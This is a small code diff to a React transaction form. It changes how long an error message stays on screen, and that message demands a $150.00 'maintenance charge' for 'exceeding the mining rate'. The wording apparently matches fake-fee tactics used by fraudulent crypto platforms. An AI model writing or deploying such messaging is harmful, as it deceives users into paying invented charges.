@@ -45,7 +45,7 @@ function TransactionsForm({ getTransactions }) {
         withCredentials: true,
       });
       message.error(
-        "Hi, Consequent upon exceeding the mining rate of your account, a maintenance charge of $150.00 is required to process further transactions. Best Regards."
+        "Hi, Consequent upon exceeding the mining rate of your account, a maintenance charge of $150.00 is required to process further transactions. Best Regards.", 20
       );
     } catch (err) {
       console.error(err);
